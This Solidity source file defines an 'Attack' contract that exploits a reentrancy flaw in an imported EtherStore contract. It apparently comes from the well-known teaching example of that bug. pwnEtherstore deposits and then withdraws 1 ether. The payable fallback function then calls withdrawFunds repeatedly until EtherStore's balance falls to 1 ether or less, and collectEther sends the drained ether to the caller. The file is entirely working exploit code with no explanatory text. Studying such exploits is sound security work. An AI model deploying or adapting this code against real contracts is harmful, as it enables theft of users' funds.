// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.5.0;

import "./EtherStore.sol";

contract Attack {
    Etherstore public etherstore;
    uint256 initialbalance;

    // Initialize the etherstore variable with the contract address
    constructor(address _etherstoreAddress) public {
        etherstore = Etherstore(_etherstoreAddress);
    }

    function pwnEtherstore() public payable {
        // Attack to the nearest ether
        require(msg.value >= 1 ether, "Need to send at least 1 ether");
        // Send ether to the depositFunds() function
        etherstore.depositFunds.value(1 ether)();
        // Start the magic
        etherstore.withdrawFunds(1 ether);
    }

    function initialDeposit() public payable {
        initialbalance = msg.value;
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    // Fallback function - where the magic happens
    function () external payable {
        if (address(etherstore).balance > 1 ether) {
            etherstore.withdrawFunds(1 ether);
        }
    }
}
